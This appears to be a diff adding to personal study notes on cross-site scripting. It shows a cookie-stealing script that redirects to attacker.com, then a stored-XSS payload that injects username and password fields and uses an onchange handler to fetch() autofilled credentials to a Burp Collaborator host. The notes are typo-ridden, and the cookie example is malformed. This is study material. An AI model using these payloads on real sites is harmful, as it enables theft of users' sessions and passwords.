@@ -28,4 +28,18 @@ like :
  <script>window.location='http//attacker.com/cookie='document.cookie</script> ----> make ue of requestbin
 
 
+3. stored xss to steal username and password ---> this type of attack onkly works when password is saved in browser and password autofill is enables in websites 
+we can create input fields for password and usernames that will be autofilled when users try to access a page and then we can trigger the javascript to sen the data to us
+eg how thica can be performed :
+
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">                 ----------> what is happening = username and password fields are empty originally so when autofill is doen we hava an event called onchange which we set 
+for password value now when it is cahnged it will call using fetch value using username and password
+
+
+
 
